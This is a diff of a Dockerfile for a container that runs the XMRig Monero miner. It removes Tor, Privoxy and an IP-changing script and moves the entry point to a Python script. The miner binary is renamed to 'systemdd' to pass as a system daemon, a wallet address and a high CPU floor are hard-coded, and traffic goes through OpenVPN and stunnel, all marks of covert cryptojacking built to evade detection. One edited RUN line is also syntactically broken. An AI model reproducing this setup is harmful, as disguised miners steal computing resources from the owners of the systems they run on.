@@ -3,10 +3,7 @@ FROM ubuntu:22.04
 
 # Install necessary tools, including Tor, Privoxy, OpenVPN
 RUN apt-get update && apt-get install -y \
-    torsocks \
     wget \
-    tor \
-    privoxy \
     openvpn \
     sudo \
     bc \
@@ -26,7 +23,6 @@ ENV VERSION="6.21.0" \
     USERNAME="44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao" \
     ALGO="rx/0" \
     DONATE="1" \
-    TOR_PORT="9051" \
     VPN_CONFIG="/etc/openvpn/client.ovpn" \
     STUNNEL="etc/stunnel/stunnel.conf" \
     CPU_MIN="90" \
@@ -44,20 +40,16 @@ RUN wget https://github.com/xmrig/xmrig/releases/download/v${VERSION}/xmrig-${VE
 RUN mv /root/work/xmrig /usr/sbin/systemdd
 
 # Copy configuration files into the container
-COPY config /etc/privoxy/config
-COPY torrc /etc/tor/torrc
-COPY start.sh /root/start.sh
-COPY change_ip.sh /root/change_ip.sh
+COPY start.py /root/start.py
 COPY client.ovpn /etc/openvpn/client.ovpn
-COPY torsocks.conf /etc/tor/torsocks.conf
 COPY stunnel.conf /etc/stunnel/stunnel.conf
 
 # Set execution permissions for the scripts and correct permissions for configuration files
-RUN chmod +x /root/start.sh /root/change_ip.sh \
-    && chmod 644 /etc/tor/torrc /etc/privoxy/config /etc/openvpn/client.ovpn /etc/tor/torsocks.conf /etc/stunnel/stunnel.conf
+RUN chmod +x /root/start.py 
+    && chmod 644 /etc/openvpn/client.ovpn /etc/stunnel/stunnel.conf
 
 # Ensure the device TUN is available for OpenVPN
 RUN mkdir -p /dev/net && mknod /dev/net/tun c 10 200
 
 # Run start.sh when the container starts
-CMD ["/root/start.sh"]
+CMD ["/root/start.py"]
